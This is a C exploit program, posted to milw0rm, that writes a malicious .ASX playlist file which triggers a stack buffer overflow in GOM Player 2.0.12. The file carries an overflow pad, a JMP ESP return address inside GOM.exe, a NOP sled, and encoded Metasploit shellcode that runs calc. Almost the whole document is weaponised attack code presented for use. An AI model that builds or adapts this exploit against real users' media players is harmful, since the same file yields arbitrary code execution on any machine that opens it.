/*------------------------------------------------
*  GOM Player 2.0.12 (.ASX) Stack Overflow Exploit
*-------------------------------------------------
* [_]Exploit Code by:DATA_SNIPER
* [_]Greetz: Arabic and algeria hackerz,arab4services.net and AT4RE Teams.
* [_]My blog:http://datasniper.arab4services.net
* NOTIFICATION:
* The vulnerabilty was reported by Parvez Anwar in Secuina after that i discovered it so all rights goes to Parvez Anwar.
* i used internal address (in GOM.exe) to JMP and run the shellcode so the exploit is Universal.
* http://secunia.com/advisories/23994
* SEH Methode can be implemented for variant exploit.
*/

#include <stdio.h>
#include <windows.h>

unsigned char Header1[] = /*ASX data in unicode format */
"\xFF\xFE\x3C\x00\x61\x00\x73\x00\x78\x00\x20\x00\x76\x00\x65\x00\x72\x00\x73\x00\x69\x00\x6F\x00\x6E\x00\x20\x00\x3D\x00\x20\x00"
"\x22\x00\x33\x00\x2E\x00\x30\x00\x22\x00\x20\x00\x3E\x00\x0D\x00\x0A\x00\x3C\x00\x65\x00\x6E\x00\x74\x00\x72\x00\x79\x00\x3E\x00"
"\x0D\x00\x0A\x00\x3C\x00\x74\x00\x69\x00\x74\x00\x6C\x00\x65\x00\x3E\x00\x48\x06\x2F\x06\x27\x06\x39\x06\x27\x06\x20\x00\x23\x06\x4A\x06\x47\x06"
"\x27\x06\x20\x00\x27\x06\x44\x06\x28\x06\x37\x06\x44\x06\x2E\x00\x6D\x00\x70\x00\x33\x00\x3C\x00\x2F\x00\x74\x00\x69\x00\x74\x00"
"\x6C\x00\x65\x00\x3E\x00\x0D\x00\x0A\x00\x3C\x00\x72\x00\x65\x00\x66\x00\x20\x00\x68\x00\x72\x00\x65\x00\x66\x00\x20\x00\x3D\x00\x20\x00\x22";
unsigned char Header2[] ="\x22\x00\x20\x00\x2F\x00\x3E\x00\x0D\x00\x0A\x00\x3C\x00\x2F\x00\x65\x00\x6E\x00\x74\x00\x72\x00\x79\x00\x3E\x00\x0D\x00\x0A\x00\x3C\x00\x2F\x00\x61\x00\x73\x00\x78\x00\x3E\x00\x0D\x00\x0A\x00";
/*windows/exec - 144 bytes,Encoder: x86/shikata_ga_nai,EXITFUNC=process, CMD=calc*/
unsigned char Shell[] =
"\x31\xc9\xbd\x90\xb7\x29\xb8\xd9\xf7\xd9\x74\x24\xf4\xb1\x1e"
"\x58\x31\x68\x11\x03\x68\x11\x83\xe8\x6c\x55\xdc\x44\x64\xde"
"\x1f\xb5\x74\x54\x5a\x89\xff\x16\x60\x89\xfe\x09\xe1\x26\x18"
"\x5d\xa9\x98\x19\x8a\x1f\x52\x2d\xc7\xa1\x8a\x7c\x17\x38\xfe"
"\xfa\x57\x4f\xf8\xc3\x92\xbd\x07\x01\xc9\x4a\x3c\xd1\x2a\xb7"
"\x36\x3c\xb9\xe8\x9c\xbf\x55\x70\x56\xb3\xe2\xf6\x37\xd7\xf5"
"\xe3\x43\xfb\x7e\xf2\xb8\x8a\xdd\xd1\x3a\x4f\x82\x28\xb5\x2f"
"\x6b\x2f\xb2\xe9\xa3\x24\x84\xf9\x48\x4a\x19\xac\xc4\xc3\x29"
"\x27\x22\x90\xea\x5d\x83\xff\x94\x79\xc1\x73\x01\xe1\xf8\xfe"
"\xdf\x46\xfa\x18\xbc\x09\x68\x84\x43";
int main( int argc, char **argv ) {
char payload[4563];
char junk[4171];/*Overflow trigger*/
unsigned char RET_Univ[] = "\x77\x45\x46\x00"; // JMP ESP in GOM.exe this make it universal, & don't worry about nullbyte,greetz go to unicode ;)
/*char RET_sp2 = "\xF3\xC3\xE1\x77" /* if im wrong up there, use this => JMP ESP in kernel32.dll XP SP2 fr */
unsigned char nop[] = "\x90\x90\x90\x90\x90\x90\x90\x90"; //Nops

FILE *f;
printf("GOM Player 2.0.12 (.ASX) Stack Overflow Exploit by DATA_SNIPER\r\n");
printf("---------------------------------------------------\r\n");
memset(junk, 0x41, 4171);
printf("[_] Building Exploit..\r\n");
memcpy( payload, Header1, sizeof( Header1 ) - 1 );
memcpy( payload + sizeof( Header1 ) - 1, junk, 4172 );
memcpy( payload + sizeof( Header1 ) + sizeof(junk)-1, RET_Univ, 4 );
memcpy( payload + sizeof( Header1 ) + sizeof(junk)+sizeof(RET_Univ)-2, nop, sizeof(nop)-1 );
memcpy( payload + sizeof( Header1 ) + sizeof(junk)+sizeof(nop)+sizeof(RET_Univ)-3, Shell, sizeof( Shell ) - 1 );
memcpy( payload + sizeof( Header1 ) + sizeof(junk)+sizeof(RET_Univ)+sizeof(nop)+ sizeof(Shell)-4, Header2, sizeof( Header2 ) - 1 );
f = fopen( "GAZA.asx", "wb" );
if ( f == NULL ) {
printf("[_] Cannot create file\n");
return 0;
}
fwrite( payload, 1, sizeof(payload) , f );
fclose( f );
    printf("[_] GAZA.asx file Created,have unf :)\r\n");
return 0;
}

// milw0rm.com [2009-01-08]
